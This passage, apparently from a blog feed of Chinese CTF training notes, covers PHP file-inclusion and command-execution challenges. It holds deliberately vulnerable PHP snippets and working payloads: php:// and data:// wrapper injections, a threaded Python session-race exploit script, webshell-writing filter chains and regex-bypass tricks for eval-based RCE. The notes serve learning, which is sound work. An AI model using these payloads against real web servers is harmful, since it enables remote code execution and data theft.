16 次方种可能。</p><p>把 2 的 16 次方种可能带入计算下一个 seed2，并且右移查看是否和第二个随机数的值相等就能确定是否正确的找到了 seed1。</p><p>如果前两个数是正数，但第三个数是负数，只需要对得到的补码再求一次补码即可，也就是取反后加 1。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件包含</title>
    <link href="/2021/10/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2021/10/05/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>?file=php://filter/read=convert.base64-encode/resource=flag.php</p><p>?file=data://text/plain,&lt;?php system(‘tac flag.php’);?&gt;</p><p>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</p></blockquote><ul><li>日志包含</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210819110931740.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210819111129373.png"></p><ul><li>session 文件竞争包含</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>点被过滤了，就不能包含日志文件了</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210822104732779.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210822104757678.png"></p><p>此时用户是可以自己定义 Session ID 的。比如，我们在<code>Cookie</code>里设置<code>PHPSESSID=flag</code>，PHP 将会在服务器上创建一个文件：<code>/tmp/sess_flag</code>。即使此时用户没有初始化 Session，PHP 也会自动初始化 Session,并产生一个键值。在 Linux 系统中，session 文件一般的默认存储位置为 <code>/tmp</code>或<code>/var/lib/php/session</code></p><p>但是<strong>session.upload_progress.cleanup 默认是开启的，一旦读取了所有 POST 数据，它就会清除进度信息</strong></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210822124557917.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;地址&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span></span><br><span class="hljs-tag">        <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;change here&quot;</span></span><br><span class="hljs-tag">      /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>抓包，添加<code>Cookie: PHPSESSID=flag</code>，在<code>PHP_SESSION_UPLOAD_PROGRESS</code>下添加一句话木马。</p><p>PHP 将会在服务器上创建一个文件：<code>/tmp/sess_flag</code></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/1999159-20201011101000761-1649541695.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/1999159-20201010204012871-1202434485.png"></p><p>两者都重复发包即可，在得到<code>ls</code>的结果后，修改包再重复发包即可。</p><p>上面所谓的 payload 可加可不加，不加将攻击类型设置为 Null Payload 即可。</p><blockquote><p>当没有直接文件包含的点时，（比如文件上传漏洞，利用了 sess 上传进度，.user.ini/ini 包含的文件/ini 包含的文件包含 sess_flag）</p><p>python 通用脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><br>sessID = <span class="hljs-string">&#x27;flag&#x27;</span><br>url = <span class="hljs-string">&#x27;http://761f62d0-9936-4b3c-be74-0b640259cea8.challenge.ctf.show:8080/&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write</span>(<span class="hljs-params">session</span>):</span><br>    <span class="hljs-keyword">while</span> event.isSet():<br>        f = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">256</span> * <span class="hljs-number">1</span>)<span class="hljs-comment">#创建文件</span><br>        response = session.post(<span class="hljs-comment">#post上传</span><br>            url,<br>            cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessID&#125;,<span class="hljs-comment">#设置cookie为sessid</span><br>            data=&#123;<span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php system(&quot;nl ../*.php&quot;);?&gt;&#x27;</span>&#125;,<br>            files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: (<span class="hljs-string">&#x27;flag.txt&#x27;</span>, f)&#125;<span class="hljs-comment">#设置post具体内容，这里可以files=file</span><br>        )<br><br><span class="hljs-comment">#def read(session):</span><br><span class="hljs-comment">#    while event.isSet():</span><br><span class="hljs-comment">#        data =&#123;</span><br><span class="hljs-comment">#            &#x27;ctf&#x27;:&quot;/tmp/sess_&quot;+sessid   #包含我们的session路径</span><br><span class="hljs-comment">#        &#125;</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span>(<span class="hljs-params">session</span>):</span><br>    <span class="hljs-keyword">while</span> event.isSet():<br>        response = session.get(url + <span class="hljs-string">&#x27;upload/index.php&#x27;</span>.<span class="hljs-built_in">format</span>(sessID)) <span class="hljs-comment">#获得相应包</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>            <span class="hljs-built_in">print</span>(response.text)<br>            event.clear()<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*]retrying...&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<span class="hljs-comment">#条件竞争</span><br>    event = threading.Event()<br>    event.<span class="hljs-built_in">set</span>()<br>    <span class="hljs-keyword">with</span> requests.session() <span class="hljs-keyword">as</span> session:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">30</span>):<br>            threading.Thread(target=write, args=(session,)).start()<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">30</span>):<br>            threading.Thread(target=read, args=(session,)).start()<br><br></code></pre></td></tr></table></figure><p>当然也可以使用 bp 完成</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211005183417107.png"></p></blockquote><ul><li>死亡 exit</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;data&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$file</span> = str_replace(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br>    file_put_contents(urldecode(<span class="hljs-variable">$file</span>), <span class="hljs-string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="hljs-variable">$content</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>base64：</p><p>GET</p><p>url 全编码：php://filter/write=convert.base64-decode/resource=1.php</p><p>POST</p><p>base64：&lt;?php system(‘tac f*‘);?&gt;</p><p>==&gt; PD9waHAgc3lzdGVtKCd0YWMgZionKTs/Pg==</p><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p><p>base64 编码中只包含 64 个可打印字符，而 PHP 在解码 base64 时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码。</p><p>所以，一个正常的 base64_decode 实际上可以理解为如下两个步骤：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>] = preg_replace(<span class="hljs-string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>]);<br>base64_decode(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>所以，当<code>$content</code>被加上了<code>&lt;?php exit;?&gt;</code>以后，我们可以使用 php://filter/write=convert.base64-decode 来首先对其解码。在解码的过程中，字符<code>&lt;</code> <code>?</code> <code>;</code> <code>&gt;</code> <code>空格</code>等一共有 7 个字符不符合 base64 编码的字符范围将被忽略，所以最终被解码的字符仅有“phpexit”和我们传入的其他字符。</p><p>“phpexit”一共 7 个字符，因为 base64 算法解码时是 4 个 byte 一组，所以给他增加 1 个“a”一共 8 个字符。这样，”phpexita”被正常解码，而后面我们传入的 webshell 的 base64 内容也被正常解码。结果就是<code>&lt;?php exit; ?&gt;</code>没有了。</p></blockquote><p>==&gt; aaPD9waHAgc3lzdGVtKCd0YWMgZionKTs/Pg==</p><p>此处为&lt;?php die(‘大佬别秀了’);?&gt; ==&gt; phpdie 故前面添加两个字符</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210903001809220.png"></p><blockquote><p>rot13</p><p>GET</p><p>全编码：php://filter/write=string.rot13/resource=2.php</p><p>POST</p><p>&lt;?cuc flfgrz(‘gnp s*‘);?&gt;</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210903002413152.png"></p><blockquote><p>.htaccess 的预包含利用</p><p>同样使用过滤器，string.strip_tags</p><p>GET</p><p>全编码：php://filter/write=string.strip_tags|convert.base64-decode/resource=1.php</p><p>POST</p><p>base64：&lt;?php system(‘tac f*‘);</p><p>==&gt; PD9waHAgc3lzdGVtKCd0YWMgZionKTs=</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210904232700304.png"></p><p>string.strip_tags 可以在 php5 的环境下顺利的使用，如果题目环境是在 php7.3.0 以上的环境下，就会出现上面的情况，但此题是可以写进去的，访问 1.php 即可</p>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>命令执行</title>
    <link href="/2021/08/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <url>/2021/08/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="eval-c"><a href="#eval-c" class="headerlink" title="eval(c)"></a>eval(c)</h2><ul><li>从绕过正则匹配的角度：</li></ul><p>过滤了关键单词 如 flag、php 在 linux 可以使用占位符<code>？</code>和<code>*</code></p><p>比如<code>flag.php</code>可以使用<code>fl??.???</code>或者<code>fl?g.??p</code>和<code>f*</code>或者 <code>f***</code>等</p><p>也可以使用空字符<code>&#39;&#39;</code>夹在过滤内容之中<code>fl&#39;&#39;ag.php</code></p><p>还可以这样<code>fla\g.php</code>或者正则<code>f[abcd]ag.php</code>、<code>f[a-z]ag.php</code> <code>[abcd]</code> (<code>[abcd]</code> 匹配<code>abcd</code>中一个字符<code>[a-z]</code> 匹配范围 <code>a-z</code>)</p><p>payload 优先级<code>* = &#39;&#39; = \ &gt; ?</code></p><ul><li>从变量逃逸的角度</li></ul><p>对一个变量的正则过滤比较多的时候 可以对变量进行逃逸 比如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br> <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br> <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>     <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br> &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br> highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>?c=eval($_GET[‘a’]);&amp;a=system(‘ls’);</p></blockquote><p>这样就可以逃过对命令执行的单一变量过滤</p><ul><li>从函数特性的角度</li></ul><p>对于 eval 可以插入 php 的完整代码 因为 eval 会将字符串当作代码执行【include 见下文】</p><blockquote><p>?c=echo hello;?&gt;&lt;?=include($_GET[‘a’]);&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</p></blockquote><p>这里有两个疑问：</p><p>一、使用 echo file_get_contents(“flag.php”)并不能在页面直接显示出来 需要查看源码 为什么</p><p>二、使用 system(‘cat flag.php’)也需要查看源码 但是使用 system(‘tac flag.php’)就能直接得到源码(倒叙)</p><p>两个都是这样输出的</p><blockquote><?php......</blockquote><p>html 并不能这样直接输出 而倒叙的 tac 输出的则是</p><blockquote><p>……</p><?php</blockquote><p>其实这就涉及 html 页面的输出问题</p><ul><li>从语言结构的角度</li></ul><p>继续 但匹配再加一个括号<code>(</code>时 上面的方法就失效了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们仍然可以使用参数逃逸 （这里<code>;</code>被过滤了可以使用<code>?&gt;</code>代替）但是要用到语言结构 <code>echo print isset unset include require</code>等不需要使用括号</p><blockquote><p>?c=include$_GET[1];&amp;1=php://filter/read=convert.base64-encode/reasource=flag.php</p></blockquote><p>这里的 include 属于文件读取范畴 也就是说逃逸出去的参数 1 不能<code>1=system(ls)</code></p><blockquote><p>当正则匹配数字的时候 逃逸参数需要改为字母</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br><br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><ul><li>过滤了 system()</li></ul><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">system</span>()<br><span class="hljs-selector-tag">passthru</span>()    # <span class="hljs-selector-tag">passthru</span> — 执行外部程序并且显示原始输出<br><span class="hljs-selector-tag">exec</span>()        # <span class="hljs-selector-tag">exec</span> — 执行一个外部程序<br><span class="hljs-selector-tag">shell_exec</span>()  # <span class="hljs-selector-tag">shell_exec</span> — 通过 <span class="hljs-selector-tag">shell</span> 环境执行命令，并且将完整的输出以字符串的方式返回。<br><span class="hljs-selector-tag">popen</span>()<br><span class="hljs-selector-tag">proc_open</span>()<br><span class="hljs-selector-tag">pcntl_exec</span>()<br>` `           # 同<span class="hljs-selector-tag">shell_exec</span>()<br><br><span class="hljs-comment">//只有system函数是有回显的，其他的函数可以通过echo等显示</span><br></code></pre></td></tr></table></figure><ul><li>过滤了 cat</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs vim">more:一页一页的显示档案内容<br>les<span class="hljs-variable">s:</span>与 more 类似<br>head:查看头几行<br>tac:从最后一行开始显示，可以看出 tac 是 <span class="hljs-keyword">cat</span> 的反向显示<br>tai<span class="hljs-variable">l:</span>查看尾几行<br>nl：显示的时候，顺便输出行号<br>od:以二进制的方式读取档案内容<br><span class="hljs-keyword">vi</span>:一种编辑器，这个也可以查看<br><span class="hljs-keyword">vim</span>:一种编辑器，这个也可以查看<br><span class="hljs-keyword">sor</span><span class="hljs-variable">t:</span>可以查看<br>uniq:可以查看<br><span class="hljs-keyword">file</span> -<span class="hljs-keyword">f</span>:报错出具体内容<br><span class="hljs-keyword">grep</span> 在当前目录中，查找后缀有 <span class="hljs-keyword">file</span> 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： <span class="hljs-keyword">grep</span> test *<span class="hljs-keyword">file</span><br>paste 指令会把每个文件以列对列的方式，一列列地加以合并。<br></code></pre></td></tr></table></figure><ul><li>过滤了空格</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$&#123;IFS&#125;</span><br><span class="hljs-variable">$IFS</span><span class="hljs-variable">$9</span><br>&lt; <span class="hljs-regexp">//</span>某些情况tac&lt;fl?g.php不能出结果 应该是不支持通配符 情况有待证实<br>&lt;&gt;<br>&#123;a,b&#125; <span class="hljs-regexp">//</span>a,b都是shell命令<br>%<span class="hljs-number">09</span>(php)<br></code></pre></td></tr></table></figure><ul><li>无参数 RCE(Remote Command/Code Execute)</li></ul><p>Ⅰ</p><blockquote><p>show_source(next(array_reverse(scandir(pos(localeconv())))));</p><p>var_dump(file_get_contents(next(array_reverse(scandir(pos(localeconv()))))));</p><p>var_dump(file_get_contents(next(array_reverse(scandir(current(localeconv()))))));//pos 是 current 的别名</p></blockquote><p>Ⅱ</p><blockquote><p>?c=session_start();system(session_id());<br>修改 PHPSESSID 的值</p></blockquote><p>Ⅲ</p><blockquote><p>?c=print_r(get_defined_vars());//获得并打印所有变量</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210803142137477.png"></p><p>有 post 变量 传值进去</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210803142221361.png"></p><p>post 变量可控 我们先尝试定位到该 post 变量</p><p>数组操作：</p><p>post 变量位于第二</p><blockquote><p>?c=print(next(get_defined_vars()))</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210803142546722.png"></p><p>取出了该数组的键值对</p><p>取出值</p><blockquote><p>?c=print(array_pop(next(get_defined_vars())))</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210803142926765.png"></p><p>接着执行 RCE 即可</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210803143029652.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210803143059815.png"></p><ul><li>缓冲区清除</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>error_reporting(<span class="hljs-number">0</span>);<br>ini_set(<span class="hljs-string">&#x27;display_errors&#x27;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$s</span> = ob_get_contents();<br>        ob_end_clean();<br>        <span class="hljs-keyword">echo</span> preg_replace(<span 